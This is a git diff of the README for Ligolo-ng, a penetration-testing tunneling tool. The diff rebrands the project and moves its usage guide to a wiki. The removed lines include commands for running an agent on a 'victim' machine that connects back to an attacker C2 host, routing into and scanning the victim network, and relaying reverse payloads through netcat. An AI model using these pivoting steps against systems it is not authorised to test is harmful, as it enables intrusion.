@@ -2,12 +2,22 @@
 
 ![Ligolo Logo](doc/logo.png)
 
-An advanced, yet simple, tunneling tool that uses a TUN interface.
-
-[by TNP IT Security](https://tnpitsecurity.com/)
+An advanced, yet simple, tunneling tool that uses TUN interfaces.
 
 [![GPLv3](https://img.shields.io/badge/License-GPLv3-brightgreen.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Go Report](https://goreportcard.com/badge/github.com/tnpitsecurity/ligolo-ng)](https://goreportcard.com/report/github.com/tnpitsecurity/ligolo-ng)
+[![Go Report](https://goreportcard.com/badge/github.com/nicocha30/ligolo-ng)](https://goreportcard.com/report/github.com/nicocha30/ligolo-ng)
+[![GitHub Sponsors](https://img.shields.io/github/sponsors/nicocha30)](https://github.com/sponsors/nicocha30)
+![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/nicocha30/ligolo-ng/total)
+
+[📑 Ligolo-ng Documentation (Setup/Quickstart)](https://github.com/nicocha30/ligolo-ng/wiki)
+
+You use Ligolo-ng for your penetration tests? Did it help you pass a certification? Please consider sponsoring the project so I can buy my team some drinks. ☕
+
+[:heart: Sponsor nicocha30](https://github.com/sponsors/nicocha30)
+
+We would like to thank the following people for their support in the development of Ligolo-ng.
+
+<!-- sponsors --><a href="https://github.com/OSCPL-byte"><img src="https://github.com/OSCPL-byte.png" width="50px" alt="OSCPL-byte" /></a>&nbsp;&nbsp;<a href="https://github.com/scmanjarrez"><img src="https://github.com/scmanjarrez.png" width="50px" alt="scmanjarrez" /></a>&nbsp;&nbsp;<!-- sponsors -->
 
 ## Table of Contents
 
@@ -16,20 +26,9 @@ An advanced, yet simple, tunneling tool that uses a TUN interface.
 
 - [Introduction](#introduction)
 - [Features](#features)
-- [How is this different from Ligolo/Chisel/Meterpreter... ?](#how-is-this-different-from-ligolochiselmeterpreter-)
-- [Building & Usage](#building--usage)
-  - [Precompiled binaries](#precompiled-binaries)
-  - [Building Ligolo-ng](#building-ligolo-ng)
-  - [Setup Ligolo-ng](#setup-ligolo-ng)
-    - [Linux](#linux)
-    - [Windows](#windows)
-    - [Running Ligolo-ng proxy server](#running-ligolo-ng-proxy-server)
-  - [TLS Options](#tls-options)
-    - [Using Let's Encrypt Autocert](#using-lets-encrypt-autocert)
-    - [Using your own TLS certificates](#using-your-own-tls-certificates)
-    - [Automatic self-signed certificates (NOT RECOMMENDED)](#automatic-self-signed-certificates-not-recommended)
-  - [Agent Binding/Listening](#agent-bindinglistening)
 - [Demo](#demo)
+- [How is this different from Ligolo/Chisel/Meterpreter... ?](#how-is-this-different-from-ligolochiselmeterpreter-)
+- [How to use - documentation - tutorial](#how-to-use---documentation---tutorial)
 - [Does it require Administrator/root access ?](#does-it-require-administratorroot-access-)
 - [Supported protocols/packets](#supported-protocolspackets)
 - [Performance](#performance)
@@ -46,14 +45,22 @@ tunnels from a reverse TCP/TLS connection using a **tun interface** (without the
 
 ## Features
 
-- **Tun interface** (No more SOCKS!)
+- **Tun interface** (No more SOCKS/Proxychains!)
 - Simple UI with *agent* selection and *network information*
 - Easy to use and setup
 - Automatic certificate configuration with Let's Encrypt
 - Performant (Multiplexing)
-- Does not require high privileges
+- Does not require privileges on the *agent*
 - Socket listening/binding on the *agent*
 - Multiple platforms supported for the *agent*
+- Can handle multiple tunnels
+- Reverse/Bind Connection
+- Automatic tunnel/listeners recovery (in case of network issues)
+- Websocket support
+
+## Demo
+
+[Ligolo-ng-demo.webm](https://github.com/nicocha30/ligolo-ng/assets/31402213/3070bb7c-0b0d-4c77-9181-cff74fb2f0ba)
 
 ## How is this different from Ligolo/Chisel/Meterpreter... ?
 
@@ -71,183 +78,9 @@ As an example, for a TCP connection:
 
 This allows running tools like *nmap* without the use of *proxychains* (simpler and faster).
 
-## Building & Usage
+## How to use - documentation - tutorial
 
-### Precompiled binaries
-
-Precompiled binaries (Windows/Linux/macOS) are available on the [Release page](https://github.com/tnpitsecurity/ligolo-ng/releases).
-
-### Building Ligolo-ng
-Building *ligolo-ng* (Go >= 1.17 is required):
-
-```shell
-$ go build -o agent cmd/agent/main.go
-$ go build -o proxy cmd/proxy/main.go
-# Build for Windows
-$ GOOS=windows go build -o agent.exe cmd/agent/main.go
-$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go
-```
-
-### Setup Ligolo-ng
-
-#### Linux
-
-When using Linux, you need to create a tun interface on the Proxy Server (C2):
-
-```shell
-$ sudo ip tuntap add user [your_username] mode tun ligolo
-$ sudo ip link set ligolo up
-```
-
-#### Windows
-
-You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as Ligolo (make sure you use the right architecture).
-
-#### Running Ligolo-ng proxy server
-
-Start the *proxy* server on your Command and Control (C2) server (default port 11601):
-
-```shell
-$ ./proxy -h # Help options
-$ ./proxy -autocert # Automatically request LetsEncrypt certificates
-```
-
-### TLS Options
-
-#### Using Let's Encrypt Autocert
-
-When using the `-autocert` option, the proxy will automatically request a certificate (using Let's Encrypt) for *attacker_c2_server.com* when an agent connects.
-
-> Port 80 needs to be accessible for Let's Encrypt certificate validation/retrieval
-
-#### Using your own TLS certificates
-
-If you want to use your own certificates for the proxy server, you can use the `-certfile` and `-keyfile` parameters.
-
-#### Automatic self-signed certificates (NOT RECOMMENDED)
-
-The *proxy/relay* can automatically generate self-signed TLS certificates using the `-selfcert` option.
-
-The `-ignore-cert` option needs to be used with the *agent*.
-
-> Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.
-### Using Ligolo-ng
-
-
-Start the *agent* on your target (victim) computer (no privileges are required!):
-
-```shell
-$ ./agent -connect attacker_c2_server.com:11601
-```
-
-> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
-
-A session should appear on the *proxy* server.
-
-``` 
-INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
-```
-
-Use the `session` command to select the *agent*.
-
-```
-ligolo-ng » session 
-? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
-```
-
-Display the network configuration of the agent using the `ifconfig` command:
-
-```
-[Agent : nchatelain@nworkstation] » ifconfig 
-[...]
-┌─────────────────────────────────────────────┐
-│ Interface 3                                 │
-├──────────────┬──────────────────────────────┤
-│ Name         │ wlp3s0                       │
-│ Hardware MAC │ de:ad:be:ef:ca:fe            │
-│ MTU          │ 1500                         │
-│ Flags        │ up|broadcast|multicast       │
-│ IPv4 Address │ 192.168.0.30/24             │
-└──────────────┴──────────────────────────────┘
-```
-
-Add a route on the *proxy/relay* server to the *192.168.0.0/24* *agent* network.
-
-*Linux*:
-```shell
-$ sudo ip route add 192.168.0.0/24 dev ligolo
-```
-
-*Windows*:
-```
-> netsh int ipv4 show interfaces
-
-Idx     Mét         MTU          État                Nom
----  ----------  ----------  ------------  ---------------------------
- 25           5       65535  connected     ligolo
-   
-> route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
-```
-
-Start the tunnel on the proxy:
-
-```
-[Agent : nchatelain@nworkstation] » start
-[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
-```
-
-You can now access the *192.168.0.0/24* *agent* network from the *proxy* server.
-
-```shell
-$ nmap 192.168.0.0/24 -v -sV -n
-[...]
-$ rdesktop 192.168.0.123
-[...]
-```
-
-### Agent Binding/Listening
-
-You can listen to ports on the *agent* and *redirect* connections to your control/proxy server.
-
-In a ligolo session, use the `listener_add` command.
-
-The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.
-```
-[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
-INFO[1208] Listener created on remote agent!            
-```
-
-On the `proxy`:
-
-```shell
-$ nc -lvp 4321
-```
-
-When a connection is made on the TCP port `1234` of the agent, `nc` will receive the connection.
-
-This is very useful when using reverse tcp/udp payloads.
-
-You can view currently running listeners using the `listener_list` command and stop them using the `listener_stop [ID]` command:
-
-```
-[Agent : nchatelain@nworkstation] » listener_list 
-┌───────────────────────────────────────────────────────────────────────────────┐
-│ Active listeners                                                              │
-├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
-│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
-├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
-│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
-└───┴─────────────────────────┴────────────────────────┴────────────────────────┘
-
-[Agent : nchatelain@nworkstation] » listener_stop 0
-INFO[1505] Listener closed.                             
-```
-
-## Demo
-
-
-https://user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4
-
+You will find the documentation for Ligolo-ng, as well as the steps to follow to get it up and running on the [Ligolo-ng Wiki](https://github.com/nicocha30/ligolo-ng/wiki)
 
 ## Does it require Administrator/root access ?
 
@@ -296,11 +129,8 @@ When using *nmap*, you should use `--unprivileged` or `-PE` to avoid false posit
 
 - Implement other ICMP error messages (this will speed up UDP scans) ;
 - Do not *RST* when receiving an *ACK* from an invalid TCP connection (nmap will report the host as up) ;
-- Implement *proxy* support for Darwin ;
 - Add mTLS support.
 
 ## Credits
 
-- Nicolas Chatelain <nicolas.chatelain -at- tnpconsultants.com>
-
-[![tnpitsecurity.com](doc/tnplogo.png)](https://tnpitsecurity.com/)
+- Nicolas Chatelain <nicolas -at- chatelain.me>
